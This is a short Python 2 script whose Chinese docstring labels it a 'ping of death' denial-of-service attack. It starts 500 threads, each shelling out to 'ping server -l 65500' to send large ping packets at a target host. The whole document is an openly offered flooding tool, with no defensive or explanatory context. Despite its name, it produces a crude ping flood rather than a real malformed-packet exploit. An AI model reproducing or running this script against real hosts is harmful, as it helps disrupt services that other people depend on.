#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""DoS 攻击 - 死亡之 ping"""

import subprocess
import thread
import time


def POD(id):
    subprocess.call("ping server -l 65500", shell=True)
    print "%d," % id


for i in range(500):
    thread.start_new_thread(POD, (i,))
    time.sleep(0.8)
